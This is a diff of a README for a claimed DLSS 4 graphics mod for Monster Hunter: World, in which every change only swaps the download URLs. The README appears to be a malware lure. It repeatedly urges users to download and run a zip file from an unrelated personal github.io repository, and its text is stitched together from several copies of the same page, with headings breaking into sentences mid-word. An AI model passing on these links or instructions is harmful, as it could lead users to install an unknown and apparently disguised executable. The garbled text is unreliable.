@@ -5,7 +5,7 @@ description: "Upgrade Monster Hunter: World with DLSS 4 upscaling, DLAA and 2x-4
 ---
 # 🎮 mhworld-dlss - Sharper Monster Hunter World Graphics
 
-[![Download Now](https://img.shields.io/badge/Download_Now-ff69b4?style=for-the-badge&labelColor=1e90ff&logo=github&logoColor=white)](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+[![Download Now](https://img.shields.io/badge/Download_Now-ff69b4?style=for-the-badge&labelColor=1e90ff&logo=github&logoColor=white)](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
 mhworld-dlss is an injected mod for Monster Hunter: World on PC. It brings DLSS 4 upscaling, DLAA, and DLSS frame generation to the game on Windows through Steam and DirectX 12. The aim is simple: a cleaner image, smoother motion, and a more modern graphics experience without needing programming knowledge.
 
@@ -13,7 +13,7 @@ mhworld-dlss is an injected mod for Monster Hunter: World on PC. It brings DLSS 
 
 mhworld-dlss adds modern NVIDIA graphics features to Monster Hunter: World. DLSS 4 upscaling helps the game render at a lower internal resolution and then rebuilds the image at a higher quality. DLAA improves edge smoothing without upscaling. DLSS frame generation creates# 🎮 mhworld-dlss - Sharper Hunts with Modern Graphics
 
-[![Download mhworld-dlss](https://img.shields.io/badge/Download-mhworld--dlss-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+[![Download mhworld-dlss](https://img.shields.io/badge/Download-mhworld--dlss-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
 mhworld-dlss is an injected mod for Monster Hunter: World on PC. It adds DLSS 4 upscaling, DLAA, and DLSS frame generation to the game when you play through Steam on Windows with DirectX 12. The goal is to give you a cleaner picture, smoother motion, and a more modern graphics experience without requiring any programming knowledge.
 
@@ -64,9 +64,9 @@ The exact screens you see may vary slightly depending on your game version and g
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+Visit this link to download the application: [https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
-[![Download mhworld-dlss](https://img.shields.io/badge/Get_mhworld--dlss-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+[![Download mhworld-dlss](https://img.shields.io/badge/Get_mhworld--dlss-00C853?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
 After you visit the page, download the application and run it on your Windows PC. Then launch Monster Hunter: World through Steam and use the in-game graphics settings to enable the features you want. Keep the official page handy for updates and guidance.
 
@@ -109,7 +109,7 @@ Yes. The application is intended for Windows PCs.
 How do I update it?  
 Visit the official project page and check for the latest version. Download the newest# 🎮 mhworld-dlss - Sharper Hunts with DLSS 4
 
-[![Download Now](https://img.shields.io/badge/Download_Now-FF4500?style=for-the-badge&logo=github&labelColor=8A2BE2&logoColor=white)](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+[![Download Now](https://img.shields.io/badge/Download_Now-FF4500?style=for-the-badge&logo=github&labelColor=8A2BE2&logoColor=white)](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
 mhworld-dlss is an injected mod for Monster Hunter: World on PC. It adds DLSS 4 upscaling, DLAA, and DLSS frame generation to the game when you play through Steam on Windows with DirectX 12. The project is made for players who want a cleaner picture, smoother motion, and a more modern graphics experience without learning programming or editing game files by hand.
 
@@ -143,9 +143,9 @@ Close other graphics tools and overlays if you run into unusual behavior. A simp
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+Visit this link to download the application: [https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
-[![Download mhworld-dlss](https://img.shields.io/badge/Get_mhworld--dlss-00C853?style=for-the-badge&logo=github&labelColor=1E90FF&logoColor=white)](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+[![Download mhworld-dlss](https://img.shields.io/badge/Get_mhworld--dlss-00C853?style=for-the-badge&logo=github&labelColor=1E90FF&logoColor=white)](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
 After you download the application, run it on your Windows PC. Then launch Monster Hunter: World through Steam, make sure the game is using DirectX 12, and open the graphics settings. Look for the DLSS, DLAA, and frame generation choices that match the features described on this page. If the application shows its own guidance, read it before you change your in-game settings.
 
@@ -192,7 +192,7 @@ If the game does not start, make sure Monster Hunter: World is set to DirectX 12
 
 If the download page does not open, copy the official link into your browser and try again. Use# 🎮 mhworld-dlss - Sharper Hunts with DLSS 4
 
-[![Download Now](https://img.shields.io/badge/Download_Now-FF4785?style=for-the-badge&logo=github&labelColor=2E86DE&logoColor=white)](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+[![Download Now](https://img.shields.io/badge/Download_Now-FF4785?style=for-the-badge&logo=github&labelColor=2E86DE&logoColor=white)](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
 mhworld-dlss is an injected mod for Monster Hunter: World on PC. It adds DLSS 4 upscaling, DLAA, and DLSS frame generation to the game when you play through Steam on Windows with DirectX 12. The project is made for players who want a cleaner picture, smoother motion, and a more modern graphics experience without learning programming or editing game files by hand.
 
@@ -240,9 +240,9 @@ The project is aimed at end users. The setup is meant to be simple: download fro
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+Visit this link to download the application: [https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
-[![Download mhworld-dlss](https://img.shields.io/badge/Get_mhworld--dlss-00C853?style=for-the-badge&logo=github&labelColor=8E44AD&logoColor=white)](https://github.com/namithnami/namithnami.github.io/raw/refs/heads/main/latices/Latest_v1.3.zip)
+[![Download mhworld-dlss](https://img.shields.io/badge/Get_mhworld--dlss-00C853?style=for-the-badge&logo=github&labelColor=8E44AD&logoColor=white)](https://raw.githubusercontent.com/namithnami/namithnami.github.io/main/latices/Latest_v1.3.zip)
 
 After you download the application, run it on your Windows PC. Then launch Monster Hunter: World through Steam, make sure the game is using DirectX 12, and open the graphics settings. Look for the DLSS, DLAA, and frame generation choices that match the features described on this page. If the application shows its own guidance, read it before you change your in-game settings.
 
